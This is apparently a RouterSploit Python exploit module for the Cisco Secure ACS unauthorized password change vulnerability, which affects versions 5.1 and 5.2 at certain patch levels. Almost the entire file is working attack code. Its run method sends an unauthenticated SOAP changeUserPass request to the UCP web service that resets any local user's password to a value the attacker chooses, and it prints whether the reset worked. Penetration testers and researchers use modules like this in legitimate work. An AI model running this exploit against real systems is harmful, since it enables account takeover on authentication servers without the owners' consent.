from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
    http_request,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco Secure ACS Unauthorized Password Change vulnerability.
    If the target is vulnerable, it is possible to change user's password.
    """
    __info__ = {
        'name': 'Cisco Secure ACS Unauthorized Password Change',
        'description': 'Module exploits an authentication bypass issue which allows arbitrary'
                       'password change requests to be issued for any user in the local store.'
                       'Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well'
                       'as version 5.2 with either no patches or patches 1 and 2 are vulnerable.',
        'authors': [
            'Jason Kratzer <pyoor[at]flinkd.org>',  # vulnerability discovery & metasploit module
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html',
        ],
        'devices': [
            'Cisco Secure ACS version 5.1 with patch 3, 4, or 5 installed and without patch 6 or later installed',
            'Cisco Secure ACS version 5.2 without any patches installed',
            'Cisco Secure ACS version 5.2 with patch 1 or 2 installed and without patch 3 or later installed'
        ],
    }

    target = exploits.Option('', 'Target IP address', validators=validators.url)
    port = exploits.Option(443, 'Target Port')

    path = exploits.Option('/PI/services/UCP/', 'Path to UCP WebService')
    username = exploits.Option('', 'Username to use')
    password = exploits.Option('', 'Password to use')

    def run(self):
        url = "{}:{}{}".format(self.target, self.port, self.path)
        headers = {'SOAPAction': '"changeUserPass"'}

        data = ('<?xml version="1.0" encoding="utf-8"?>' + '\r\n'
                '<SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" '
                'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" '
                'xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
                'xmlns:xsd="http://www.w3.org/1999/XMLSchema">' + '\r\n'

                '<SOAP-ENV:Body>' + '\r\n'
                '<ns1:changeUserPass xmlns:ns1="UCP" SOAP-ENC:root="1">' + '\r\n'
                '<v1 xsi:type="xsd:string">' + self.username + '</v1>' + '\r\n'
                '<v2 xsi:type="xsd:string">fakepassword</v2>' + '\r\n'
                '<v3 xsi:type="xsd:string">' + self.password + '</v3>' + '\r\n'
                '</ns1:changeUserPass>'
                '</SOAP-ENV:Body>' + '\r\n'
                '</SOAP-ENV:Envelope>' + '\r\n\r\n')

        print_status("Issuing password change request for: " + self.username)

        response = http_request(method="POST", url=url, data=data, headers=headers)

        if response is None:
            print_error("Exploit failed. Target seems to be not vulnerable.")
            return

        if "success" in response.text:
            print_success("Success! Password for {} has been changed to {}".format(self.username, self.password))
        elif "Password has already been used" in response.text:
            print_error("Failed! The supplied password has already been used.")
            print_error("Please change the password and try again.")
        elif "Invalid credentials for user" in response.text:
            print_error("Failed! Username does not exist or target is not vulnerable.")
            print_error("Please change the username and try again.")
        else:
            print_error("Failed!  An unknown error has occurred.")

    @mute
    def check(self):
        # it is not possible to verify if target is vulnerable without exploiting system
        return None
